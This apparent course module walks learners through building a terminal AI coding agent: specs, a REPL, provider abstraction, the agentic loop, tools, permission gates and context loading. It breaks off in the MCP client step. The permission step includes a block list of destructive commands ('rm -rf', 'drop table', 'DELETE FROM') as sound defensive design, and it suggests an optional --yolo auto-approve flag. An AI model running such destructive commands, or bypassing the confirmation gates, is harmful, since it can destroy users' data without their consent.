---
id: module-g
number: 2
title: Build Your Own Coding Agent
subtitle: 180 minutes - Spec, build, test, use, and verify an AI coding agent
---

## step: the-big-picture
### title: What You're Building

You're about to build a fully functional AI-powered terminal coding agent — a simplified but real version of tools like Claude Code and Copilot CLI. By the end of this module, you'll type natural language into your terminal and watch your agent read files, write code, run tests, and commit to git — using whichever LLM provider you prefer.

**But here's the twist:** You'll build this agent using *the same methodology you learned in the Foundation Track*. Spec-driven development. Instruction files. Skills. Testing. Verification. The methodology IS the product.

**Why this matters:**

Every concept from the Foundation Track (Parts 0-8) suddenly has a mechanical explanation:

| What you learned before | What you'll understand now |
|------------------------|---------------------------|
| "Put rules in instruction files" | "The agent reads these files and injects them into the system prompt" |
| "Agent Mode loops until done" | "It's a `while` loop checking for tool calls in the response" |
| "Agents have `tools:` restrictions" | "I built the permission gate that enforces this" |
| "MCP servers expose tools" | "I built both the server AND the client" |
| "Skills load on demand" | "Pattern-match the query, lazy-load the file" |
| "Different tools, different APIs" | "Both map to the same LLMProvider interface I built" |

**The architecture:**

```
my-coding-agent/
├── specs/
│   ├── PRD.md                # Requirements (spec-driven!)
│   └── Tasks.md              # Task checklist mapped to requirements
├── src/
│   ├── index.ts              # CLI entry point (REPL + headless)
│   ├── agent.ts              # Core agentic loop
│   ├── providers/
│   │   ├── types.ts          # LLMProvider interface & shared types
│   │   ├── anthropic.ts      # Anthropic (Claude) implementation
│   │   ├── openai.ts         # OpenAI-compatible implementation
│   │   └── index.ts          # Auto-detect & provider factory
│   ├── tools/
│   │   ├── registry.ts       # Tool registration & permission system
│   │   ├── read-file.ts      # Read file contents
│   │   ├── write-file.ts     # Write/edit files (with diff preview)
│   │   ├── run-command.ts    # Execute shell commands (with approval)
│   │   ├── list-directory.ts # List directory contents
│   │   └── search-files.ts   # Grep/glob search across project
│   ├── context/
│   │   ├── loader.ts         # Reads instruction files (any ecosystem)
│   │   └── memory.ts         # Conversation history + /compact
│   ├── skills/
│   │   ├── loader.ts         # Skill discovery & lazy loading
│   │   └── matcher.ts        # Pattern matching for skill activation
│   └── mcp/
│       └── client.ts         # MCP client — connects to external servers
├── skills/                   # Agent's own skills (meta!)
│   ├── refactor/SKILL.md
│   └── explain/SKILL.md
├── tests/                    # Jest test suite
│   ├── tools.test.ts
│   ├── agentic-loop.test.ts
│   └── permissions.test.ts
├── AGENT.md                  # The agent's own instruction file (meta!)
├── package.json
└── tsconfig.json
```

**The workflow you'll follow:**

```
SPEC IT (G0)  →  BUILD IT (G1-G7)  →  EXTEND IT (G8)  →  TEST IT (G9-G11)  →  USE IT (G12)
    │                 │                    │                   │                   │
    │                 │                    │                   │                   │
    ▼                 ▼                    ▼                   ▼                   ▼
 PRD.md         Each step            Skill system         Jest tests         Use your agent
 Tasks.md       satisfies R#         Custom commands      Verification       on a real project
 AGENT.md       requirements         delivers on          against PRD        before deploying
                                     overview promise
```

> **Meta moment:** You'll use Claude Code or Copilot CLI (from Module F) to help you BUILD a tool like them. AI helping you build AI. And you'll use spec-driven development to build a spec-driven development tool.

---

## step: spec-the-agent
### title: Step G0: Spec the Agent First

Before writing a single line of code, let's define WHAT we're building. This is the spec-driven development pattern from Parts 1-2 — and it's how professionals build software.

:::diagram spec-driven-cycle
:::

> **🔗 Foundation Connection:** In Part 1, you created `specs/PRD.md` with numbered requirements before building. In Part 2, you added `specs/Tasks.md` mapping tasks to requirements. Now you'll apply the same pattern to build a real developer tool.

**Why spec first matters more here:**

The agent you're building will have 8+ files across 5 directories. Without a spec, you'll lose track of what you're building halfway through. The PRD is your north star.

:::prompt
number: G0
title: Create the Agent Specification
---
Create a complete specification for my-coding-agent following the patterns from Parts 1-2:

**1. Create `specs/PRD.md`:**

```markdown
# my-coding-agent - Product Requirements Document

## Overview
A terminal-based AI coding agent that reads files, writes code, runs commands, and connects to MCP servers — using any LLM provider.

## Target Users
Developers who want:
- Terminal-native AI coding assistance
- Multi-provider flexibility (Anthropic, OpenAI, etc.)
- Full control over tools and permissions
- Integration with existing MCP servers

## Requirements

### Core Architecture
- **R1**: Interactive REPL with colored prompt and slash commands (/help, /clear, /exit)
- **R2**: Graceful handling of Ctrl+C and errors (never crash, always recover)

### Provider System
- **R3**: LLMProvider interface that abstracts any LLM API
- **R4**: Anthropic provider implementation (Claude models)
- **R5**: OpenAI-compatible provider (GPT, GitHub Models, Azure)
- **R6**: Auto-detection of provider from environment variables

### Agentic Loop
- **R7**: While loop that continues until LLM stops calling tools
- **R8**: Safety limit preventing infinite loops (max 25 iterations)
- **R9**: Error recovery that feeds errors back to LLM for self-correction

### Tool System
- **R10**: Tool registry with JSON Schema definitions
- **R11**: Core tools: read_file, write_file, list_directory, search_files, run_command
- **R12**: Permission system: auto (safe), confirm (risky), block (dangerous)
- **R13**: Diff preview for write operations, command preview for shell execution

### Context Loading
- **R14**: Load instruction files (AGENT.md, CLAUDE.md, copilot-instructions.md)
- **R15**: Scan project structure (package.json, directory tree)
- **R16**: /init command to generate instruction file from project scan

### MCP Integration
- **R17**: Read MCP server config from .mcp.json
- **R18**: Connect to configured servers and discover tools
- **R19**: Route tool calls to correct MCP server or built-in tool

### Skill System
- **R20**: Discover skills from skills/ directory at startup
- **R21**: Pattern-match user queries to skill descriptions
- **R22**: Lazy-load skill content when matched

### Polish
- **R23**: /compact command to summarize and reduce context
- **R24**: /cost command to show token usage and estimated cost
- **R25**: Streaming responses (tokens appear in real-time)
- **R26**: Headless mode with -p flag for CI/scripting
- **R27**: Startup banner showing provider, project, tools count

## Success Criteria
The agent can:
1. Chat conversationally about any codebase
2. Read and understand project files
3. Make code changes with permission gates
4. Run commands safely
5. Connect to MCP servers from Module A
6. Load and apply skills on demand
7. Run in CI pipelines via headless mode
```

**2. Create `specs/Tasks.md`:**

```markdown
# my-coding-agent - Implementation Tasks

## Phase 1: Foundation
- [ ] **Task 1**: Create project scaffold (package.json, tsconfig.json, src/)
  - Satisfies: R1
  - Done when: `npm start` launches REPL with colored prompt

- [ ] **Task 2**: Implement slash commands (/help, /clear, /exit, Ctrl+C)
  - Satisfies: R1, R2
  - Done when: All commands work, Ctrl+C exits gracefully

## Phase 2: Provider System  
- [ ] **Task 3**: Define LLMProvider interface and types
  - Satisfies: R3
  - Done when: types.ts exports Message, ToolDef, LLMResponse, LLMProvider

- [ ] **Task 4**: Implement Anthropic provider
  - Satisfies: R4
  - Done when: Chat works with ANTHROPIC_API_KEY

- [ ] **Task 5**: Implement OpenAI provider
  - Satisfies: R5
  - Done when: Chat works with OPENAI_API_KEY

- [ ] **Task 6**: Add provider auto-detection factory
  - Satisfies: R6
  - Done when: Agent selects correct provider from env vars

## Phase 3: Agentic Loop
- [ ] **Task 7**: Implement the agentic while loop
  - Satisfies: R7, R8
  - Done when: Agent loops on tool calls, stops on completion

- [ ] **Task 8**: Add error recovery (catch and feed back)
  - Satisfies: R9
  - Done when: Invalid tool names return error string, not exception

## Phase 4: Tool System
- [ ] **Task 9**: Create ToolRegistry with register/execute methods
  - Satisfies: R10
  - Done when: Tools can be registered and executed by name

- [ ] **Task 10**: Implement core tools (read, write, list, search, run)
  - Satisfies: R11
  - Done when: Agent can read files and answer questions about them

- [ ] **Task 11**: Add permission system (auto/confirm/block)
  - Satisfies: R12, R13
  - Done when: Write shows diff preview, run shows command, both ask permission

## Phase 5: Context Loading
- [ ] **Task 12**: Build ContextLoader to read instruction files
  - Satisfies: R14, R15
  - Done when: Agent describes project based on AGENT.md content

- [ ] **Task 13**: Implement /init command
  - Satisfies: R16
  - Done when: /init generates and saves AGENT.md

## Phase 6: MCP Integration
- [ ] **Task 14**: Create MCPManager to read config and connect
  - Satisfies: R17, R18
  - Done when: MCP tools appear in startup summary

- [ ] **Task 15**: Route tool calls to MCP or built-in
  - Satisfies: R19
  - Done when: Agent can call weather server from Module A

## Phase 7: Skill System
- [ ] **Task 16**: Implement skill discovery and indexing
  - Satisfies: R20
  - Done when: skills/ directory is scanned at startup

- [ ] **Task 17**: Add query-to-skill pattern matching
  - Satisfies: R21, R22
  - Done when: "refactor this function" loads refactor skill

## Phase 8: Polish
- [ ] **Task 18**: Add /compact and /cost commands
  - Satisfies: R23, R24
  - Done when: /cost shows tokens and estimated cost

- [ ] **Task 19**: Add response streaming
  - Satisfies: R25
  - Done when: Responses appear token-by-token

- [ ] **Task 20**: Add headless mode (-p flag)
  - Satisfies: R26
  - Done when: `node agent.js -p "query"` works in scripts

- [ ] **Task 21**: Add startup banner with full summary
  - Satisfies: R27
  - Done when: Startup shows provider, project, tool count
```

**3. Create `AGENT.md` (the agent's own instruction file):**

```markdown
# my-coding-agent

## Project Overview
Terminal-based AI coding agent with multi-provider support, tool system, MCP client, and skill loading.

## Build & Run
- Install: `npm install`
- Dev: `npm start` (runs with tsx)
- Build: `npm run build`
- Test: `npm test`

## Architecture
- `src/index.ts` — CLI entry point, REPL loop, slash commands
- `src/agent.ts` — Core agentic loop, tool execution
- `src/providers/` — LLM provider abstraction (Anthropic, OpenAI)
- `src/tools/` — Tool registry and implementations
- `src/context/` — Instruction file loader, conversation memory
- `src/skills/` — Skill discovery and pattern matching
- `src/mcp/` — MCP client for external server integration

## Conventions
- TypeScript with strict mode
- ES modules (import/export)
- Async/await for all I/O
- Error handling: catch and return error strings (never crash the agent)
- Permissions: read-only tools are 'auto', write/run are 'confirm'

## How to Make Changes
1. Check specs/PRD.md for requirements
2. Check specs/Tasks.md for the current task
3. Implement minimally to satisfy the requirement
4. Test manually in the REPL
5. Mark task complete in Tasks.md

## Do NOT
- Hard-code API keys (use environment variables)
- Add frameworks (keep it vanilla Node.js + TypeScript)
- Skip permission checks for write/execute operations
- Catch errors silently (always log or return error message)
```

===
I'm building a terminal-based AI coding agent called "my-coding-agent" — like a simpler version of Claude Code. Create three spec files: 1) specs/PRD.md with about 27 numbered requirements covering: interactive REPL with slash commands, LLM provider abstraction for Anthropic and OpenAI, agentic while-loop with safety limits, tool system (read/write files, run commands, search) with permission gates (auto/confirm/block), context loading from instruction files, MCP client integration, skill system with pattern matching and lazy loading, and polish features (streaming, headless mode, /compact, /cost). 2) specs/Tasks.md mapping about 21 tasks to those requirements across 8 phases. 3) AGENT.md with project conventions and a "Do NOT" list. Follow the spec-driven pattern from Parts 1-2.
:::

**Test your spec:**

```bash
mkdir my-coding-agent
cd my-coding-agent
```

Now use Claude Code or Copilot CLI to create the spec files:

```
> Create the specs/ directory with PRD.md and Tasks.md following 
  the structure I described. Also create AGENT.md in the project root.
```

Read through the generated files. This is your contract for the rest of Module G.

### ✅ Checkpoint
- [ ] `specs/PRD.md` exists with 27 numbered requirements (R1-R27)
- [ ] `specs/Tasks.md` exists with 21 tasks mapped to requirements
- [ ] `AGENT.md` exists with project conventions
- [ ] You understand what you're building before writing code

**This is the spec-driven mindset.** Every step from here forward will reference which requirements it satisfies.

---

## step: the-repl-shell
### title: Step G1: The REPL Shell — R1, R2

> **Satisfies:** R1 (Interactive REPL), R2 (Graceful error handling)

Every terminal AI tool starts with the same foundation: a Read-Eval-Print Loop. Let's build one.

:::prompt
number: G1
title: Create the agent project scaffold
---
Create a new Node.js TypeScript project called "my-coding-agent" with this structure:

```
my-coding-agent/
├── src/
│   ├── index.ts     # CLI entry point
│   └── agent.ts     # Placeholder for agent logic
├── package.json
├── tsconfig.json
└── AGENT.md
```

Requirements:
1. package.json with:
   - name: "my-coding-agent"
   - type: "module"
   - Dependencies: readline (built-in), chalk (for colors)
   - Dev dependencies: typescript, @types/node, tsx
   - Scripts: "start": "tsx src/index.ts", "build": "tsc"

2. tsconfig.json targeting ES2022, NodeNext module resolution

3. src/index.ts should:
   - Import readline from 'node:readline'
   - Import chalk from 'chalk'
   - Show a startup banner with the agent name and version
   - Create a REPL loop that:
     a. Shows a colored prompt (e.g., green ">" )
     b. Reads user input
     c. Handles special commands: /help, /clear, /exit
     d. For now, echoes the input back as "You said: [input]"
   - Handle Ctrl+C gracefully (show "Goodbye!" and exit)

4. AGENT.md with basic project description

Keep it simple — no AI yet, just the shell.

===
Scaffold a Node.js TypeScript project called "my-coding-agent". Set up package.json with type: module, tsx for dev, and chalk for colors. Create src/index.ts with a readline-based REPL that shows a colored prompt, handles /help /clear /exit commands, gracefully handles Ctrl+C, and echoes user input for now. Include tsconfig.json targeting ES2022 with NodeNext modules, and a basic AGENT.md.
:::

**Install and test:**

```bash
cd my-coding-agent
npm install
npm start
```

You should see a colored prompt. Type anything and it echoes back. Type `/help` to see commands. Type `/exit` to quit.

### ✅ Checkpoint
- [ ] Project scaffolded with TypeScript
- [ ] REPL launches with colored prompt
- [ ] `/help`, `/clear`, `/exit` commands work
- [ ] Ctrl+C exits gracefully

**Tasks completed:** Task 1, Task 2  
**Requirements satisfied:** R1, R2

---

## step: connect-the-brain
### title: Step G2: Connect the Brain — R3, R4, R5, R6

> **Satisfies:** R3 (Provider interface), R4 (Anthropic), R5 (OpenAI), R6 (Auto-detection)

Now let's wire up an LLM so the agent can think. But here's a crucial design choice: **don't hard-code a single provider.**

Every LLM API does the same thing — takes messages in, returns a response (sometimes with tool calls). By building a **provider abstraction**, your agent works with Anthropic, OpenAI, GitHub Models, or any compatible API.

:::diagram provider-abstraction
:::

**The core insight — one interface, multiple implementations:**

```typescript
interface LLMProvider {
  name: string
  chat(systemPrompt: string, messages: Message[], tools: ToolDef[]): Promise<LLMResponse>
}

interface LLMResponse {
  text?: string
  toolCalls?: { id: string; name: string; input: Record<string, unknown> }[]
  done: boolean
  usage?: { inputTokens: number; outputTokens: number }
}
```

Every LLM API maps onto this interface. The differences are just wiring:

:::tabs
tab: Anthropic
---
```bash
npm install @anthropic-ai/sdk
```

The Anthropic SDK reads `ANTHROPIC_API_KEY` from your environment. Your provider implementation maps Anthropic's `tool_use` content blocks and `stop_reason` field into the generic `LLMResponse` format.

**Environment:** `export ANTHROPIC_API_KEY=your-key-here`

tab: OpenAI
---
```bash
npm install openai
```

The OpenAI SDK reads `OPENAI_API_KEY` from your environment. For GitHub Models, also set `OPENAI_BASE_URL=https://models.inference.ai.azure.com`. Your provider maps OpenAI's `tool_calls` array and `finish_reason` into the generic `LLMResponse`.

**Environment:** `export OPENAI_API_KEY=your-key-here`
:::

> **🔗 Foundation Connection:** In Module F, you learned that Claude Code and Copilot CLI are both "full agentic coding agents" with different ecosystems. The provider abstraction is WHY they feel the same — underneath, every LLM API converges to this pattern.

:::prompt
number: G2
title: Connect LLM with provider abstraction
---
Update my-coding-agent to connect to an LLM with a provider abstraction:

1. Create src/providers/types.ts with:
   - Message type: { role: 'user' | 'assistant'; content: string }
   - ToolDef type: { name: string; description: string; inputSchema: object }
   - ToolCall type: { id: string; name: string; input: Record<string, unknown> }
   - LLMResponse type: { text?: string; toolCalls?: ToolCall[]; done: boolean; usage?: { inputTokens: number; outputTokens: number } }
   - LLMProvider interface: { name: string; chat(systemPrompt: string, messages: Message[], tools: ToolDef[]): Promise<LLMResponse> }

2. Create src/providers/anthropic.ts:
   - Add dependency: @anthropic-ai/sdk
   - Implement LLMProvider using Anthropic's messages.create API
   - Model: "claude-sonnet-4-latest" (or specify version like "claude-sonnet-4-20250514")
   - Map Anthropic's response format to generic LLMResponse
   - Map Anthropic's tool_use content blocks to generic ToolCall[]

3. Create src/providers/openai.ts:
   - Add dependency: openai
   - Implement LLMProvider using OpenAI's chat.completions.create API
   - Model: "gpt-4o" (configurable via OPENAI_MODEL env var)
   - Map OpenAI's response format to generic LLMResponse
   - Map OpenAI's tool_calls to generic ToolCall[]
   - Support OPENAI_BASE_URL for GitHub Models / Azure OpenAI

4. Create src/providers/index.ts:
   - Export a createProvider(name?: string) factory function
   - Auto-detect from env vars: ANTHROPIC_API_KEY → Anthropic, OPENAI_API_KEY → OpenAI
   - Allow explicit selection via AGENT_PROVIDER env var

5. Create src/agent.ts with:
   - An Agent class that accepts an LLMProvider
   - A system prompt: "You are a helpful coding assistant that runs in the terminal. You help developers understand and modify codebases."
   - A messages array for conversation history
   - A chat(userMessage) method that sends to the provider and returns the response

6. Update src/index.ts to:
   - Create the provider (auto-detected or explicit)
   - Create the Agent with the provider
   - Show which provider was selected on startup
   - Send user input to agent.chat(), display the response
   - Handle API errors gracefully (show error, continue REPL)

===
Add multi-provider LLM support to my-coding-agent. Create an LLMProvider TypeScript interface with a chat() method that takes system prompt, messages, and tool definitions. Implement it for Anthropic (using @anthropic-ai/sdk, mapping tool_use blocks) and OpenAI (using openai package, supporting OPENAI_BASE_URL for GitHub Models). Add a factory that auto-detects the provider from env vars. Create an Agent class that uses the provider, and update the REPL to send messages through it. Handle API errors gracefully.
:::

**Test it:**

:::tabs
tab: Anthropic
---
```bash
export ANTHROPIC_API_KEY=your-key-here
npm start
```

tab: OpenAI
---
```bash
export OPENAI_API_KEY=your-key-here
npm start
# For GitHub Models:
# export OPENAI_BASE_URL=https://models.inference.ai.azure.com
```
:::

```
> Hello! What can you help me with?
```

The agent responds conversationally using whichever provider you configured. It can't do anything yet (no tools), but the brain is connected.

**Why this matters:** You just built the same pattern used by every multi-model AI tool. LangChain, Vercel AI SDK, LiteLLM — they all start with a provider abstraction. Yours is simpler and you understand every line.

### ✅ Checkpoint
- [ ] Provider interface defined with generic types
- [ ] At least one provider implemented (Anthropic or OpenAI)
- [ ] Agent auto-detects which API key is available
- [ ] Chat works end-to-end through the REPL

**Tasks completed:** Tasks 3-6  
**Requirements satisfied:** R3, R4, R5, R6

---

## step: the-agentic-loop
### title: Step G3: The Agentic Loop — R7, R8, R9

> **Satisfies:** R7 (While loop), R8 (Safety limit), R9 (Error recovery)

This is the most important step. The **agentic loop** is the single pattern that powers every AI coding agent — Claude Code, GitHub Copilot Agent Mode, Cursor — all of them.

:::diagram agentic-loop
:::

**The pattern (using your provider abstraction):**

```typescript
while (true) {
  const response = await provider.chat(systemPrompt, messages, toolDefinitions)

  if (response.toolCalls && response.toolCalls.length > 0) {
    // The LLM wants to use tools — execute each one
    for (const call of response.toolCalls) {
      const result = await executeTool(call.name, call.input)
      // Feed the result back so the LLM can decide what to do next
    }
    // Loop continues automatically
  } else {
    // No tool calls = LLM is done
    console.log(response.text)
    break
  }
}
```

**That's it.** Every AI coding agent is this loop with different tools plugged in. Because you built the provider abstraction in Step G2, this loop works identically whether the LLM is Claude, GPT, or any other model.

:::collapsible
title: How the raw APIs differ under the hood
---
Your provider abstraction normalizes these differences so the agentic loop stays clean:

**Anthropic API:**
- Signals tool use via `stop_reason === "tool_use"`
- Tool calls appear in `response.content` as blocks with `type: "tool_use"`
- Tool results sent as `type: "tool_result"` with `tool_use_id`

**OpenAI API:**
- Signals tool use via `finish_reason === "tool_calls"`
- Tool calls appear in `response.choices[0].message.tool_calls` array
- Tool results sent as messages with `role: "tool"` and `tool_call_id`

Your `LLMProvider` maps both patterns to `response.toolCalls` and `response.done`. The agentic loop never sees the difference.
:::

> **🔗 Foundation Connection:** In Part 1, you used Agent Mode and it "just kept going" until the task was done. This `while` loop IS that behavior. The Agent Mode UI is a pretty wrapper around exactly this pattern.

:::prompt
number: G3
title: Implement the agentic loop
---
Refactor src/agent.ts to implement the agentic loop:

1. Update the Agent class:
   a. Add a `tools` property (array of ToolDef — empty for now)
   b. Refactor `chat()` to implement the agentic loop:
      - Call this.provider.chat(systemPrompt, messages, tools)
      - If response.toolCalls has entries:
        * Add assistant message to history
        * For each tool call, execute via this.executeTool(name, input)
        * Add tool result messages to history
        * Continue the loop
      - If response.done (no tool calls):
        * Return the text response
        * Break the loop
      - Safety limit: max 25 iterations to prevent infinite loops
   c. Add an `executeTool(name: string, input: Record<string, unknown>)` method:
      - For now, return "Tool not implemented yet"
      - Log which tool was called (for debugging)

2. Handle errors gracefully in executeTool:
   - If a tool name doesn't exist in the registry, return an error string (NOT an exception)
   - If tool execution throws, catch it and return the error as a tool result
   - The LLM sees the error and self-corrects on the next iteration
   - This prevents the #1 agent bug: crashes from hallucinated tool names

3. Update src/index.ts to:
   - Show "Thinking..." while the agent works
   - Show "[Tool: tool_name]" when a tool is called (so the user sees what's happening)
   - Print the final response

The agent won't have real tools yet, but the loop structure must be correct.

===
Refactor my agent's chat() method to implement the agentic loop: a while(true) loop that calls the LLM, checks for tool calls in the response, executes each tool and feeds results back as messages, then continues. When there are no tool calls, return the text. Add a 25-iteration safety limit. Make executeTool() return error strings instead of throwing so the LLM self-corrects on hallucinated tool names. Show "Thinking..." and tool call indicators in the REPL.
:::

**Common failure modes (and how your code handles them):**

| Failure | Cause | Your Defense |
|---------|-------|-------------|
| Infinite loop | LLM keeps calling tools forever | Max 25 iteration limit |
| Hallucinated tool | LLM invents a tool name | Return error string; LLM self-corrects |
| Invalid arguments | Tool gets wrong parameter types | Catch errors, return message |
| Context overflow | Too many tool results fill the context | `/compact` command (Step G8) |

### ✅ Checkpoint
- [ ] Agent uses the agentic loop pattern
- [ ] Safety limit prevents infinite loops
- [ ] Tool errors are caught and fed back (not thrown)
- [ ] Loop works the same regardless of which LLM provider is active

**Tasks completed:** Tasks 7-8  
**Requirements satisfied:** R7, R8, R9

**This is the mind-blow moment.** You've just built the engine that powers every AI coding agent. Everything else is just plugging in tools.

---

## step: build-tools
### title: Step G4: Build the Tool System — R10, R11

> **Satisfies:** R10 (Tool registry), R11 (Core tools)

Now let's give the agent real capabilities. Each tool is a function with a JSON schema (so the LLM knows how to call it) and an execute function.

:::prompt
number: G4
title: Build the tool registry and core tools
---
Create a complete tool system for my-coding-agent:

1. Create src/tools/registry.ts:
   - Define a Tool interface:
     ```typescript
     interface Tool {
       name: string
       description: string
       inputSchema: object   // JSON Schema for parameters
       permission: 'auto' | 'confirm' | 'block'
       execute: (input: any) => Promise<string>
     }
     ```
   - Create a ToolRegistry class:
     a. register(tool: Tool) — adds a tool
     b. getTool(name: string) — returns a tool by name
     c. getToolDefinitions() — returns all tools as ToolDef[] (provider converts to API format)
     d. executeTool(name: string, input: any) — executes a tool and returns result

2. Create src/tools/read-file.ts:
   - Tool name: "read_file"
   - Description: "Read the contents of a file at the given path"
   - Input: { path: string }
   - Execute: Read file using fs/promises, return contents
   - Handle errors: file not found → clear error message

3. Create src/tools/list-directory.ts:
   - Tool name: "list_directory"
   - Description: "List files and directories at the given path"
   - Input: { path: string }
   - Execute: Read directory, mark folders with trailing /
   - Default path: current directory

4. Create src/tools/search-files.ts:
   - Tool name: "search_files"
   - Description: "Search for files matching a pattern or containing text"
   - Input: { pattern: string, path?: string }
   - Execute: Use glob pattern matching or grep-like text search
   - Ignore node_modules and .git directories

5. Create src/tools/write-file.ts:
   - Tool name: "write_file"
   - Description: "Write content to a file, creating it if it doesn't exist"
   - Input: { path: string, content: string }
   - Execute: Write file using fs/promises
   - IMPORTANT: This tool needs permission (we'll add that in Step G5)

6. Create src/tools/run-command.ts:
   - Tool name: "run_command"
   - Description: "Execute a shell command and return the output"
   - Input: { command: string }
   - Execute: Use child_process.exec, return stdout + stderr
   - Set a 30-second timeout
   - IMPORTANT: This tool needs permission (we'll add that in Step G5)

7. Update src/agent.ts:
   - Import ToolRegistry and all tools
   - Register all tools on Agent construction
   - Pass tool definitions to the provider via the agentic loop
   - Use registry.executeTool() in the loop (provider handles format conversion)

Test by asking: "What files are in this directory?" or "Read the package.json file"

===
Build a tool system for my coding agent. Create a ToolRegistry class where tools register with name, description, JSON Schema input definition, permission level, and execute function. Implement five tools: read_file (fs/promises), list_directory (mark folders with /), search_files (glob/grep, ignore node_modules), write_file, and run_command (child_process.exec, 30s timeout). Wire the registry into the agentic loop so tools are passed to the LLM and executed when called.
:::

**Test your tools:**

```bash
npm start
```

```
> What files are in the current directory?
> Read the package.json and tell me what dependencies I have
> Search for any TODO comments in the source code
```

The agent should now actually read your files and give real answers based on your project.

**Tasks completed:** Tasks 9-10  
**Requirements satisfied:** R10, R11

---

## step: permission-gates
### title: Step G5: Permission Gates — R12, R13

> **Satisfies:** R12 (Permission system), R13 (Diff/command preview)

Right now your agent can write files and run commands without asking. That's dangerous. Let's add the same permission system that Claude Code and VS Code Agent Mode use.

:::prompt
number: G5
title: Add permission gates to tools
---
Add a permission system to my-coding-agent:

1. Update src/tools/registry.ts:
   - Add a `permission` field to the Tool interface:
     ```typescript
     permission: 'auto' | 'confirm' | 'block'
     ```
   - 'auto': Execute immediately, no prompt (read-only tools)
   - 'confirm': Ask user for permission before executing
   - 'block': Refuse to execute (dangerous operations)
   
   - Update executeTool() to check permissions:
     a. 'auto' → execute immediately
     b. 'confirm' → show what will happen, ask "Allow? [y/n]", only execute on 'y'
     c. 'block' → return "This operation is not allowed for safety reasons"

2. Set permission levels:
   - read_file → 'auto'
   - list_directory → 'auto'
   - search_files → 'auto'
   - write_file → 'confirm' (show the file path and content preview)
   - run_command → 'confirm' (show the command that will be run)

3. Add blocked command patterns to run_command:
   - Block commands containing: rm -rf, format, drop table, DELETE FROM
   - Show warning: "⚠️ This command is blocked for safety: [reason]"

4. For write_file confirmation, show a diff-like preview:
   - If file exists: show what will change (simplified — show first/last few lines)
   - If new file: show "[NEW FILE] path/to/file.ts (X lines)"

5. Use chalk to color the permission prompts:
   - Yellow for confirm prompts
   - Red for blocked operations
   - Green for auto-approved operations (logged subtly)

===
Add a permission system to my tool registry with three levels: 'auto' (execute immediately for read-only tools), 'confirm' (show preview and ask yes/no for write_file and run_command), and 'block' (refuse dangerous patterns like rm -rf, DROP TABLE). Show diff-like previews for writes, command previews for execution. Color the prompts with chalk: yellow for confirm, red for blocked, green for auto.
:::

**Test the permission system:**

```bash
npm start
```

```
> Create a new file called test.txt with the content "Hello from my agent!"
```

The agent should show you what it wants to write and ask for permission:

```
📝 Write file: test.txt (1 line)
   Content: Hello from my agent!
   Allow? [y/n]: 
```

```
> Run the command: ls -la
```

```
🔧 Run command: ls -la
   Allow? [y/n]: 
```

### ✅ Checkpoint
- [ ] Read-only tools execute without prompting
- [ ] Write operations show preview and ask permission
- [ ] Run commands show the command and ask permission
- [ ] Dangerous commands are blocked entirely

**Mind-blow moment:** You just built the exact same permission system that Claude Code and Copilot CLI use. When they ask "Allow? [Y/n]" — it's running code exactly like what you just wrote.

### 🎯 Try It Yourself

Customize the permission system:

1. Make `write_file` auto-approved for `.md` files but confirmed for code files
2. Add a `--yolo` flag that sets all tools to 'auto' (useful for quick scripts, dangerous for production)
3. Add a safe-list for `run_command` — commands like `ls`, `cat`, `pwd`, `git status`, `git diff` should be auto-approved

This mirrors real-world behavior — Claude Code and Copilot CLI both auto-approve safe commands but confirm risky ones.

**Tasks completed:** Task 11  
**Requirements satisfied:** R12, R13

---

## step: context-loader
### title: Step G6: Context Loader — R14, R15, R16

> **Satisfies:** R14 (Load instruction files), R15 (Scan project), R16 (/init command)

Now let's make the agent understand project conventions by reading instruction files — the same ones you created in Parts 3–6.

> **🔗 Foundation Connection:** In Part 3, you created `copilot-instructions.md` and the agent "just followed the rules." Step G6 is where you build the code that reads that file and injects it into the system prompt. The magic was this code all along.

:::prompt
number: G6
title: Build the context loader
---
Create src/context/loader.ts that loads project context into the system prompt:

1. Create a ContextLoader class with:
   a. `loadProjectContext(projectPath: string): Promise<string>` that:
      - Checks for these files (in priority order):
        * AGENT.md
        * CLAUDE.md
        * .github/copilot-instructions.md
        * AGENTS.md
        * .cursor/rules/ (Cursor editor)
      - Reads whichever exist and includes the content in the system prompt
      - If multiple exist, combine them with clear headers
      - Log which files were found (every agent ecosystem has its own instruction file, but they all solve the same problem)

   b. `scanProjectStructure(projectPath: string): Promise<string>` that:
      - Reads package.json (if exists) for project name, dependencies, scripts
      - Lists the top-level directory structure
      - Returns a formatted summary like:
        ```
        Project: my-coding-agent
        Type: Node.js TypeScript
        Dependencies: @anthropic-ai/sdk, chalk
        Scripts: start, build
        Structure: src/, package.json, tsconfig.json, AGENT.md
        ```

   c. `buildSystemPrompt(projectPath: string): Promise<string>` that:
      - Combines the base system prompt with project context
      - Includes the project structure scan
      - Includes instruction file contents
      - Formats it as a clear system prompt

2. Update src/agent.ts:
   - Use ContextLoader on initialization
   - Load project context for current working directory
   - Include it in the system prompt sent to the API
   - Log which instruction files were found (helpful for debugging)

3. Create an `/init` command in src/index.ts:
   - When user types `/init`, scan the project and generate an AGENT.md file
   - Show the generated content and ask for confirmation before writing

===
Create a ContextLoader class that finds and reads instruction files (AGENT.md, CLAUDE.md, copilot-instructions.md, AGENTS.md, .cursor/rules/), scans package.json and directory structure for project info, and combines everything into the system prompt. Also add a /init command that auto-generates an AGENT.md file from a project scan, with confirmation before writing.
:::

**Test it:**

```bash
npm start
```

```
> What project am I working in? What are the rules?
```

The agent should describe your project based on the AGENT.md file it loaded.

```
> /init
```

Should generate and offer to save an AGENT.md file.

**Mind-blow moment:** You just built the system that reads `copilot-instructions.md` AND `CLAUDE.md`. When VS Code Agent Mode or Claude Code follows your rules — this is the code that makes it work. Different filenames, same mechanism.

**Tasks completed:** Tasks 12-13  
**Requirements satisfied:** R14, R15, R16

---

## step: mcp-client
### title: Step G7: MCP Client Integration — R17, R18, R19

> **Satisfies:** R17 (Read MCP config), R18 (Connect and discover), R19 (Route tool calls)

This is where everything connects. In Module A, you built MCP **servers** (weather, quotes, GitHub). Now you'll build the **client** that talks to them.

:::prompt
number: G7
title: Build MCP client support
---
Create src/mcp/client.ts that connects to MCP servers:

1. Add dependency: @modelcontextprotocol/sdk

2. Create an MCPManager class:
   a. `loadConfig(configPath?: string)`:
      - Read .mcp.json or .vscode/mcp.json from project root
      - Parse server definitions (each has: command, args)
      - Example config:
        ```json
        {
          "servers": {
            "weather": {
              "command": "node",
              "args": ["mcp-servers/weather-server/src/index.js"]
            }
          }
        }
        ```

   b. `connectToServer(name: string, config: ServerConfig)`:
      - Spawn the server process using StdioClientTransport
      - Create an MCP Client instance
      - Connect and perform the handshake
      - Discover available tools via client.listTools()
      - Store the connection for later use

